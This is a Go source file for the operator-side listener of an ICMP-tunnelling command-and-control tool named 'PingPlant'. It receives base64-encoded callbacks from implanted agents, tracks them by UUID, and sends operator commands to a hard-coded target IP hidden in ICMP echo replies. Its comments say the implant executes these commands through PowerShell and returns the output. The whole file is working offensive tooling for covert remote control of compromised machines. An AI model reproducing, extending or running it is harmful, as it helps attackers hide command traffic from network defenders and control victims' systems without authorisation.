// This is the code for the listening server that will run on attackers machine
// Will wait for, parse, and send communications from targets via pingPlants

// TODO: Filter comms based on targets or only parse/output certain traffic
// TODO: Implement secret message for initial callback to add to a global targets map

package main

import (
	"bufio"
	// Base Libs
	"encoding/base64"
	"encoding/hex"
	"errors"
	"fmt"
	"net"
	"os"
	"strings"

	// External Libs
	"github.com/AlecAivazis/survey/v2"
	"github.com/fatih/color"
	"github.com/manifoldco/promptui"
	"github.com/olekukonko/tablewriter"
	"github.com/rs/zerolog"
	"github.com/rs/zerolog/log"
	"github.com/satori/go.uuid"

	// Golang Libs
	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
)

// targetIP is the const variable of the IP to send data to
// TODO: Change to whatever agent you are interacting with
const targetIP = "10.2.175.74"
const secretMessage = "Activate"

var agentChoice []string
var activeAgent string
var conn *net.IPConn

var Agents = make(map[uuid.UUID]*Agent)

// Agent is a server side structure that holds information about a Merlin Agent
type Agent struct {
	ID       uuid.UUID
	Platform string
	UserName string
	HostName string
	Ips      []string
	Pid      int
}

// validateOptions is a function that just helps check to make sure you're choosing a correct option
func validateOptions(slice []string, val string) bool {
	for _, item := range slice {
		if strings.EqualFold(item, val) {
			return true
		}
	}
	return false
}

func ReadData(buf []byte, packetData int) {
	var firstCallback = true
	src := buf[8:packetData]

	hexToString := hex.EncodeToString(src)

	hexDecode, _ := hex.DecodeString(hexToString)
	//log.Info().Bytes("Data", hexDecode).Msg("hexDecode")

	base64Text := make([]byte, base64.StdEncoding.DecodedLen(len(hexDecode)))

	decode, _ := base64.StdEncoding.Decode(base64Text, []byte(hexDecode))

	agentData := base64Text[:decode]
	//log.Info().Bytes("Data", agentData).Msg("agentData from ReadData")

	// if data contains uuid
	initialUuid, inituuidErr := uuid.FromString(string(agentData))
	if inituuidErr != nil {
		//log.Error().Err(inituuidErr).Msg("Error on inituuidErr")
		firstCallback = false
	}
	if firstCallback {
		_, _ = NewAgentCallback(initialUuid)
	} else {
		//log.Info().Str("Response", string(agentData)).Msg("Received Response from Host")
		data := [][]string{
			{string(agentData)},
		}
		table := tablewriter.NewWriter(os.Stdout)
		table.SetHeader([]string{"Response"})

		table.SetAutoWrapText(false)
		table.SetBorder(false)
		table.SetHeaderLine(true)
		table.AppendBulk(data)
		//for _, v := range data {
		//		table.Append(v)
		//			fmt.Println(v)
		//		}
		fmt.Println()
		table.Render()
		color.Set(color.FgGreen)
		fmt.Printf("[%s] PingPlant >> ", activeAgent)
	}
	return

}

// isAgent enumerates a map of all instantiated agents and returns true if the provided agent UUID exists
func isAgent(agentID uuid.UUID) bool {
	for agent := range Agents {
		if Agents[agent].ID == agentID {
			return true
		}
	}
	return false
}

// PingListen is a function that handles the "server" portion of the implant
// Which will just listen for ICMP traffic, parse it, decode it, and then send it to a new powershell process
// in which it will then execute the command it received, encode it, and send it out
// Added a chunking portion that handles large data outputs
func PingListen() {
	for {
		protocol := "icmp"

		netaddr, err := net.ResolveIPAddr("ip4", "0.0.0.0")
		if err != nil {
			fmt.Printf("[-] Error in Resolve IPAddr: %s\n\n", err)
		}
		conn, err = net.ListenIP("ip4:"+protocol, netaddr)
		if err != nil {
			fmt.Printf("[-] Error in ListenIP: %s\n\n", err)
		}

		buf := make([]byte, 100000)

		packetData, _, err := conn.ReadFrom(buf)
		if err != nil {
			fmt.Printf("[+] Error reading packet data, %s\n\n", err)
		}
		log.Info().Int("PingListen", packetData)
		ReadData(buf, packetData)

		// This means new agent has called back
		//agent, agentErr := NewAgentCallback(packetData)
		//if agentErr != nil {
		//	log.Error().Str("Error from PingListen", agentErr.Error())
		//}
		//log.Info().Str("AgentData From PingListen", (agent.ID).String())
	}
}

func NewAgentCallback(agentUUID uuid.UUID) (Agent, error) {
	var agent Agent

	//agentUuid, _ := uuid.FromString(string(agentUUIDString))
	log.Info().Str("Agent ID", (agentUUID).String()).Msg("New Agent Checked In!")
	if isAgent(agentUUID) {
		return agent, fmt.Errorf("the %s agent already exists", agentUUID)
	}

	agent.ID = agentUUID

	// Add agent to global map
	Agents[agentUUID] = &agent
	return agent, nil

}

func EncodeData(input string) string {
	data := base64.StdEncoding.EncodeToString([]byte(input))
	return data
}

func SendData(data string, seq int) {

	wm := icmp.Message{
		Type: ipv4.ICMPTypeEchoReply, Code: 0,
		Body: &icmp.Echo{
			ID: os.Getpid() & 0xffff, Seq: seq,
			Data: []byte(data),
		},
	}

	wb, err := wm.Marshal(nil)
	if err != nil {
		log.Fatal().AnErr("Marshal Error", err)
	}
	if _, err := conn.WriteTo(wb, &net.IPAddr{IP: net.ParseIP(targetIP)}); err != nil {
		log.Fatal().AnErr("WriteTo Error", err)
	}

}

func main() {
	log.Logger = log.Output(zerolog.ConsoleWriter{Out: os.Stderr})
	//buf := make([]byte, 100000)

	for {

		options := []string{"Listen", "Help", "List", "Interact"}
		validate := func(input string) error {
			found := validateOptions(options, input)

			if !found {
				return errors.New("invalid option")
			}

			return nil
		}

		// Each template displays the data received from the prompt with some formatting.
		templates := &promptui.PromptTemplates{
			Prompt:  "{{ . }} ",
			Valid:   "{{ . | green }} ",
			Invalid: "{{ . | red }} ",
			Success: "{{ . | cyan }} ",
		}

		// Init Prompt
		prompt := promptui.Prompt{
			Label:     "PingPlant >>",
			Templates: templates,
			Validate:  validate,
		}

		// Result holds whatever you type into the prompt
		result, err := prompt.Run()

		if err != nil {
			fmt.Printf("Prompt failed %v\n", err)
			return
		}

		if strings.EqualFold(result, "Help") {
			fmt.Println("")
			fmt.Println(color.HiYellowString("[ Valid Commands ]		[ Description ]"))
			fmt.Println("------------------      	---------------") // Literally just aesthetic
			fmt.Println(" ")
			fmt.Println(" Help				Display this help menu")
			fmt.Println(" List				List all the previously checked in agents")
			fmt.Println(" ")

		}

		if strings.EqualFold(result, "Listen") {
			go PingListen()
		}

		if strings.EqualFold(result, "List") {
			for agents := range Agents {
				fmt.Println(agents)
			}

		}

		if strings.EqualFold(result, "Interact") {
			var agents []string
			for k := range Agents {
				agents = append(agents, k.String())
			}
			prompt := &survey.Select{
				Message: "Choose an agent to interact with:",
				Options: agents,
			}

			survey.AskOne(prompt, &activeAgent)

			for {
				reader := bufio.NewReader(os.Stdin)
				color.Set(color.FgGreen)
				fmt.Printf("[%s] PingPlant >> ", activeAgent)
				color.Unset()
				text, _ := reader.ReadString('\n')
				text = strings.Replace(text, "\n", "", -1)
				text = strings.Replace(text, "\r", "", -1)

				data := EncodeData(text)
				SendData(data, 3)

			}
		}

		/*			for {
						reader := bufio.NewReader(os.Stdin)
						color.Set(color.FgGreen)
						fmt.Print("PingPlant/Interact >> ")
						color.Unset()
						text, _ := reader.ReadString('\n')
						text = strings.Replace(text, "\n", "", -1)
						text = strings.Replace(text, "\r", "", -1)

						if strings.Contains(text, "agent") {
							agentChoice = strings.Split(text, "agent ")
							activeAgent = strings.Join(agentChoice[1:], "")
							break
						}
					}

					for {
						reader := bufio.NewReader(os.Stdin)
						color.Set(color.FgGreen)
						fmt.Printf("[%s] PingPlant >> ", activeAgent)
						color.Unset()
						text, _ := reader.ReadString('\n')
						text = strings.Replace(text, "\n", "", -1)
						text = strings.Replace(text, "\r", "", -1)

						data := EncodeData(text)
						SendData(data, 3)

					}*/

		//hostnameOption := flag.Bool("hostname", false, "")
		//userOption := flag.Bool("username", false, "")
		//commandOption := flag.String("command", "", "Command to run. Results will be sent to target over ICMP")

		//flag.Parse()

		//if *hostnameOption {
		//		hostname := GetHostname()
		//		SendData(hostname, 1)
		//	}

		//	if *userOption {
		//		userDir := GetDir()
		//		SendData(userDir, 2)
		//	}

		//	if *commandOption != "" {
		//		min := 0
		//		max := 700
		//		rand.Seed(time.Now().UnixNano())
		//		seq := rand.Intn(max-min+1) + min
		//		//output, _ := exec.Command("powershell.exe", "/c", *commandOption).Output()
		//		encodedCommand := EncodeData([]byte(*commandOption))
		//		SendData(encodedCommand, seq)

	}

}
